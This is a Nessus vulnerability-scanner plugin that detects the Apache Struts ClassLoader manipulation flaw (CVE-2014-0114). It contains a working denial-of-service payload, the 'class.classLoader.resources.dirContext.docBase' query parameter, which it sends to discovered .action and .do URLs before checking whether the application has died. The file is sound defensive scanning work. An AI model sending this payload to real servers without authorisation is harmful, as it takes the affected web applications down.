#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(73919);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2016/12/14 20:33:27 $");

  script_cve_id("CVE-2014-0114");
  script_bugtraq_id(67121);
  script_osvdb_id(106409);

  script_name(english:"Apache Struts ClassLoader Manipulation");
  script_summary(english:"Exploits a DoS condition.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web application that uses a Java
framework that is affected by a ClassLoader manipulation
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web application appears to use Struts, a web application
framework. The version of Struts in use contains a flaw that allows
the manipulation of the ClassLoader via the 'class' parameter of an
ActionForm object that results a denial of service.

Note that this vulnerability may be exploited to execute arbitrary
remote code in certain application servers with specific
configurations; however, Nessus has not tested for this issue.

Additionally, note that this plugin will only report the first
vulnerable instance of a Struts application.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2014/Apr/177");
  script_set_attribute(attribute:"see_also", value:"https://bugzilla.redhat.com/show_bug.cgi?id=1091938");
  script_set_attribute(attribute:"see_also", value:"https://access.redhat.com/site/solutions/869353");
  script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/struts1eol-announcement.html");
  # http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Protect-your-Struts1-applications/ba-p/6463188#.U2eVtKJ6Nat
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f383505d");

  script_set_attribute(attribute:"solution", value:
"Unknown at this time. Note that Struts 1 has reached end-of-life and
is no longer supported.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache Struts ClassLoader Manipulation Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/04/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/05/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action and .do suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = eregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (!isnull(match))
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = eregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
  }
}
if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);
}

if (max_index(urls) == 0)
  audit(AUDIT_WEB_FILES_NOT, "Struts .do / .action", port);

urls = list_uniq(urls);

script = SCRIPT_NAME - ".nasl" + "-" + unixtime();

foreach url (urls)
{
  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : url,
    exit_on_fail : TRUE
  );

  if (res[0] != "404 Not Found")
  {
    vuln_url = url + "?class.classLoader.resources.dirContext.docBase=" +script;

    res2 = http_send_recv3(
      method : "GET",
      port   : port,
      item   : vuln_url,
      exit_on_fail : FALSE
    );

    if (
      (res2[0] =~ "200 OK|500 Internal Server Error")
    )
    { sleep(4);
      # One more check to ensure application is dead
      res = http_send_recv3(
        method : "GET",
        item   : url,
        port   : port,
        fetch404 : TRUE,
        exit_on_fail : TRUE
      );
      if (res[0] =~ "404 Not Found")
      {
        vuln = TRUE;
        # Stop after first vulnerable Struts app is found
        break;
      }
    }
  }
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  request    : make_list(build_url(qs:vuln_url, port:port)),
  output     : chomp(res[2])
);
